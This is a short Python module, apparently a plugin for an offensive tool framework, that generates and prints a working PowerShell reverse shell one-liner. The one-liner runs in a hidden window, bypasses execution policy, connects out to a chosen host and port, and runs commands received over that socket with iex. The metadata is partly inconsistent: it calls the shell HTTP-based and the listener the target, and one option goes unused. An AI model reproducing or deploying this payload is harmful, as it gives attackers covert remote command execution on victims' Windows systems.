#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for an HTTP-based PowerShell reverse shell tool
metadata = {
    "name": "SignalShell PowerShell Reverse Shell",
    "description": "An HTTP-based PowerShell reverse shell that executes commands from disk stealthily.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for the shell",
            "required": False,
            "default": "http",
        },
    },
}


class Encoder:
    pass


def generate_hidden_powershell_reverse_shell(lhost, lport):
    """Generates a stealthy PowerShell reverse shell command"""
    return f"""
powershell -nop -W hidden -noni -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
"""


def run(args):
    """Execute the PowerShell reverse shell based on given arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    powershell_script = generate_hidden_powershell_reverse_shell(lhost, lport)
    print(powershell_script)
